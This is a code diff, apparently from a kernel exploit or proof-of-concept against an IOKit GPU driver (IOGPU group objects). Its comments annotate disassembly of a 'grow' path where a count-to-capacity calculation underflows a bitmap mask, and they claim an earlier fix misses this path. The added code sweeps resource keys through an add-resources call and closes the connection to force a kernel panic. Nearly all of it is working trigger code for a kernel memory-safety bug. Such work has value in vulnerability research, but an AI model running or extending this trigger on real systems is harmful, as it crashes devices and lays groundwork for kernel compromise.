@@ -318,6 +318,45 @@ void nk_iogpu_group_oob_run(int trigger)
     memcpy(&grp, out + 0x10, 8);
     ol("[grp] STEP 2 group ptr = 0x%016llx", (unsigned long long)grp);
 
+    /* ---- DIRECT GROW TRIGGER ----------------------------------------
+       The bug that is alive on 26.2 is the GROW path, not the creation
+       path:
+         0x9f64938: ldr  w8, [x0, #0x20]   ; count
+         0x9f6493c: lsl  w9, w8, #1         ; w9 = count*2
+         0x9f64940: mov  x21, w8            ; x21 = count*2  <- NEW capacity
+         0x9f64948: cmp  x21, w9
+         0x9f6494c: b.lo 0x9f64940
+         0x9f649a8: mov  x1, x21            ; capacity
+         0x9f649ac: bl   0x9f611ec          ; init(): obj+40=(cap>>6)-1
+       count==1 => capacity==2 => mask==0xffffffff. There is NO
+       `cmp w2,#0x3f` on this path (that guard is only in 0x9f60fcc, the
+       direct-creation path), so the 18.4 fix does not cover it.
+
+       cmd 130 (s_group_add_resources) resolves struct[56] to an object in
+       the device resource list and adds it to the group; 0x9f62b3c accepts
+       an element whose type byte (obj+0x10) is 3, i.e. a GROUP. So:
+         1. create a group (cmd 3, capacity 64)      -> it enters the list
+         2. cmd 130 with struct[56] = its key         -> count 0->1 -> grow
+         3. close the connection                     -> destructor walks the
+            bitmap with mask 0xffffffff              -> kernel panic
+       The key is the index in the device resource list, so we sweep 0..15. */
+    if (trigger) {
+        ol("[grp] DIRECT GROW: sweeping struct[56] keys 0..15 against the new group");
+        for (uint32_t key = 0; key < 16; key++) {
+            ol("[grp] GROW key=%u", key);
+            kr = call_sel(conn, CMD_ADD_RES, key, 1, 0, 0, out, &on);
+            ol("[grp] GROW key=%u -> kr=0x%x", key, kr);
+            if (kr != (int)0xe00002c2 && kr != (int)0xe00002c7) {
+                ol("[grp] *** GROW key=%u ACCEPTED (kr=0x%x) - closing the connection "
+                   "to destroy the group (underflowed bitmap walk)", key, kr);
+                IOServiceClose(conn);
+                ol("[grp] connection closed (group destroyed) - expect the kernel to panic");
+                return;
+            }
+        }
+        ol("[grp] GROW: no key accepted");
+    }
+
     /* ---- step 4 (read back the group BEFORE any add) ---- */
     if (grp) {
         uint8_t obj0[0x40];
